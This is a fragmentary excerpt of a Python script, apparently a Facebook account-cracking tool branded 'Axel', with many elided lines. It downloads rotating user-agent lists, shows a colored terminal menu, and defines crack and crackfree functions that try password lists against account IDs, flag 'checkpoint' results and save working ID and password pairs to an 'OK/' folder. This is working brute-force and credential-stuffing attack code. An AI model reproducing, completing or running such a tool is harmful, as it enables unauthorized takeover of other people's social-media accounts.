...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/tawhidul52?mibextid=ZbWKwL')
#------------------[ Imon Shah ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/imonshah143/AXEL.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/imonshah143/AXEL.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/imonshah123?mibextid=ZbWKwL')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING MOBILE DATA Wi-Fi ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
...
def menu():
    ...
    if AXEL in ['111']:
        ...
        os.system('xdg-open https://wa.me/8801612063812')
        os.system("python nono.py")
    elif AXEL in ['3','03']:
        result()
    elif AXEL in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Axel•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Axel-Cp] {idf} • {pw}')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Axel-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  Axel,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
